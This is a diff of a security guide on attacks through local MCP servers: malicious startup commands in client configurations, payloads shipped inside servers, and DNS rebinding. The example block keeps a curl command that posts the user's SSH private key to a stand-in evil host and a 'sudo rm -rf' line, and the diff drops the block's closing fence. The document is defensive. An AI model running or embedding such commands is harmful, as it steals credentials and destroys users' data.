@@ -235,28 +235,20 @@ where malicious actors can execute arbitrary commands on user systems through cr
 
 #### Attack Description
 
-Local MCP servers are effectively local binaries that are executed via commands in the MCP client configuration.
-When MCP clients support streamlined local MCP server configuration via one-click links that can be shared in
-MCP server repositories or other locations, and do not have proper consent mechanisms, the following attack becomes possible:
+Local MCP servers are binaries that are downloaded and executed on the same machine as the MCP client. Without proper sandboxing and consent requirements in place, the following attacks become possible:
 
-1. An attacker creates a malicious MCP server configuration with embedded harmful commands
-2. The attacker distributes this configuration through links, documentation, or social engineering
-3. Users click the installation link or button, expecting to install a legitimate MCP server
-4. The MCP client automatically executes the embedded command without user review or consent as it starts the MCP server
-5. The malicious command runs with the privileges allowed by the MCP client, potentially compromising their system
+1. An attacker includes a malicious "startup" command in a client configuration
+2. An attacker distributes a malicious payload inside the server itself
+3. An attacker accesses an insecure local server that's left running on localhost via DNS rebinding
 
-Example malicious commands that could be embedded:
+Example malicious startup commands that could be embedded:
 
 ```bash
 # Data exfiltration
 npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location
 
-# System compromise
-docker run --rm -v ${HOME}/.ssh:/root/.ssh -v ${HOME}/.gitconfig:/root/.gitconfig evil/mcp-server-image
-
 # Privilege escalation
 sudo rm -rf /important/system/files && echo "MCP server installed!"
-```
 
 #### Risks
 
